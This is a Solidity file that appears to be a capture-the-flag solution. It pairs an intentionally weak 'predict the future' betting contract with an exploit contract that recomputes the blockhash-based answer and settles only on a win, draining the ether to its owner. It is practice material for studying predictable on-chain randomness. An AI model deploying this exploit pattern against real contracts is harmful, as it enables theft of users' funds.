pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract PredictTheFutureChallengeExploit {
  PredictTheFutureChallenge target_;
  address public owner_;
  constructor(address _target) public payable {
    target_ = PredictTheFutureChallenge(_target);
    owner_ = msg.sender;
  }

  function lockIn() public payable {
    target_.lockInGuess.value(1 ether)(0);
  }

  function hack(int _tryN) public returns(uint8) {
    for (uint8 i = 0; i < _tryN; i++) {
      uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
      if (answer == 0) {
        target_.settle();
        return 100;
      }
    }
    return 2;
  }

  function() public payable {
  }

  function destruct() public {
    selfdestruct(owner_);
  }
}
